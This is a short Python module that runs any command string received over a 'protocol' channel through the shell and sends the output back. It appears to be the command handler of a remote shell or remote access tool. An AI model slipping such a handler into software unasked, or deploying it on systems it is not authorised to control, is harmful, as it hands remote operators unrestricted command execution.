import subprocess
import threading


def run_command(protocol, command, proc_holder=None):
    try:
        proc = subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        if proc_holder is not None:
            proc_holder['proc'] = proc
        stdout_value, stderr_value = proc.communicate()
        result = stdout_value + stderr_value
        try:
            result = result.decode('utf-8', errors='replace')
        except Exception:
            result = result.decode('latin-1', errors='replace')
        protocol.send(result)
    except Exception as e:
        protocol.send(f'[-] Error executing command: {str(e)}')
    finally:
        if proc_holder is not None:
            proc_holder['proc'] = None


def run_command_async(protocol, command):
    t = threading.Thread(target=run_command, args=(protocol, command))
    t.daemon = True
    t.start()
    return t
